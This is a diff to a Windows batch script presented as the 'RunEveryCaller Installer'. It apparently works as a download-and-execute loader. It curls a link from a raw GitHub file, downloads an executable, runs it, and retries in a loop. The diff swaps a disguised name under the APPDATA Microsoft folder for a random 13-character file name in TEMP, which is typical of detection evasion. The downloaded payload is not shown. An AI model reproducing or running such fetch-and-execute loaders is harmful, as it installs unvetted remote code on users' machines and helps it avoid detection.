@@ -1,13 +1,36 @@
 :: RunEveryCaller Installer
 @echo off
- 
+
+
+setlocal enabledelayedexpansion
+
+
 color 0A
  
 :loop
- 
+
+
+
+set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+set "filename="
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+
+echo.
+echo Filename=!filename!.exe
+echo.
+
+
+
 :: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+taskkill /f /im !filename!.exe
+del /f /q "%TEMP%\!filename!.exe"
  
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
 
@@ -16,17 +39,17 @@ echo RUNFILELINK=%RUNFILELINK%
 echo.
 
 :: Download the file using curl
-curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
+curl -L -# -o "%TEMP%\!filename!.exe" "%RUNFILELINK%"
  
-timeout /t 2 /nobreak >nul
+timeout /t 2 /nobreak 
  
 :: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+if not exist "%TEMP%\!filename!.exe" (
     echo.
     echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo.
 	goto loop
 )
@@ -34,19 +57,19 @@ if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
  
  
 :: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
  
  
  
 :: Check if the file size is at least 80KB (80000 bytes)
 if %FILESIZE% geq 80000 (
-    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+    start "" "%TEMP%\!filename!.exe"
 ) else (
 echo.
     echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
+	timeout /t 2 /nobreak 
 	echo.
 	goto loop
 )
